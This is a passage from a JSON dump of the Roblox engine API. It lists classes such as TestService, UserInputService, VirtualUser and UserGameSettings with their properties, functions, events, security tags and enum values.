gion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":["notCreatable"]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":["RobloxScriptSecurity"],"Class":"TextService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"ImageUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"VideoUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"pingUrl","Default":null},{"Type":"int","Name":"interval","Default":null}],"Name":"SetPing","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"En